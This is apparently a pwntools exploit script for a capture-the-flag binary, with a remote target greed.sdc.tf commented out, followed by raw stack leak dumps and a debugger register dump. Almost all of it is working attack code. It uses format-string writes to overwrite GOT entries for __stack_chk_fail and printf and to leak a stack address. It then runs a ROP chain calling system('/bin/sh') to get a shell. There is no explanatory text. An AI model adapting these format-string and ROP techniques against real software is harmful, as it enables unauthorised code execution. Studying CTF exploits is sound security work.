from pwn import *
import sys

elf = ELF("chall")

io = process(elf.path)
# io = remote('greed.sdc.tf', 1337)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

gdb.attach(io, gdbscript='b *0x0000000000400938')

fini_array_addr = 0x600e18
writable_addr_oft = elf.got["__stack_chk_fail"] - fini_array_addr

print(f'offset = {hex(writable_addr_oft)}')
print(f'main() addr = {hex(elf.sym["main"])}')

p = b'%%%dc%%42$n' % writable_addr_oft
p += b'%%%dc%%12$hn' % (((elf.sym["main"]) & 0xffff) - writable_addr_oft)
p += b'%1$p'
p += b'\x00' * (32 - len(p))
p += p64(elf.got["__stack_chk_fail"])


io.sendlineafter(b'want?\n', b'-100000')
io.sendlineafter(b'audience?\n', p)

r = io.recvuntil(b'You may')
stack_addr = int(r[-19:-7].decode(), 16)
print(f'stack addr = {hex(stack_addr)}')

canary_addr = stack_addr + 0x2638
binsh_addr = stack_addr + 0x2618
pop5_ret_addr = 0x004009db

p = b'%13$n'
p += b'A'
p += b'%14$hn'
p += b'%%%dc%%15$hn' % (((elf.sym["main"] + 284) & 0xffff) - 1)
p += b'%%%dc%%16$n' % ((pop5_ret_addr & 0xffffffff) - ((elf.sym["main"] + 284) & 0xffff))
p += b'\x00' * (40 - len(p))
p += p64(elf.got["printf"] + 4)
p += p64(canary_addr)
p += p64(elf.got["__stack_chk_fail"])
p += p64(elf.got["printf"])
p += b'/bin/sh\x00'

io.sendlineafter(b'want?\n', b'-100000')
io.sendlineafter(b'audience?\n', p)

p = b'A' * 8
p += p64(next(elf.search(asm('pop rdi ; ret'), executable=True)))
p += p64(binsh_addr)
p += p64(next(elf.search(asm('ret'), executable=True)))
p += p64(elf.sym["system"])

sleep(3)
io.sendline(p)

io.interactive()


temote:  0x7fffe5d1cc10 (nil)          (nil) 0xe 0xe            0xfffe796000000000 0xfffe7d488001869f 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa70 0x7fffe5d1f420 0x117a5c818dffeb00 (nil) 0x7fca796c9083 0x7fca798cb620 0x7fffe5d1f428 0x100000000 0x4007e7 0x400980 0xe8aeac321d4885ad 0x400700 0x7fff67bddd80 (nil) (nil) 0xe979d0d6e13728f5 0xe9cd9c5dd81928f5 (nil)          (nil) (nil) 0x1            0x7fff67bddd88 0x7fff67bddd98 0x7fa542188190 (nil) (nil)

retmote: 0x7ffda7d38080 0x7f6abe3368c0 (nil) 0xe 0x7f6abe560500 0xfffe796000000000 0xfffe7d488001869f 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa70 0x7ffda7d3a880 0x250b9faa93eb8400 0x400980 0x7f6abdf6ac87 0x1 0x7ffda7d3a888 0x100008000 0x4007e7 (nil) 0xee054501cb3f46c9            0x400700 0x7fff40d23b90 (nil) (nil) 0x3760cc5c722a7edd 0x36182ffedfd47edd 0x7fff00000000 (nil) (nil) 0x7f43314168d3 0x7f43313fc638 0x80312        (nil)          (nil) (nil)

RAX  0x0
 RBX  0x0
 RCX  0x0
 RDX  0x7ffff7dcf8c0 (_IO_stdfile_1_lock) ◂— 0x0
*RDI  0x1
 RSI  0x7fffffffb710 ◂— 'ss\n you said: nted money out of thin air, you have 4294868296!!! Is there anything you would like to say to the audience?\n'
*R8   0x3
 R9   0x7ffff7ff6580 ◂— 0x7ffff7ff6580
 R10  0x7ffff7ff6580 ◂— 0x7ffff7ff6580
 R11  0x246
 R12  0x400700 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffdf10 ◂— 0x1
 R14  0x0
 R15  0x0
*RBP  0x400980 (__libc_csu_init) ◂— push   r15
*RSP  0x7fffffffde38 —▸ 0x7ffff7a03c87 (__libc_start_main+231) ◂— mov    edi, eax
*RIP  0x400964 (main+381) ◂— ret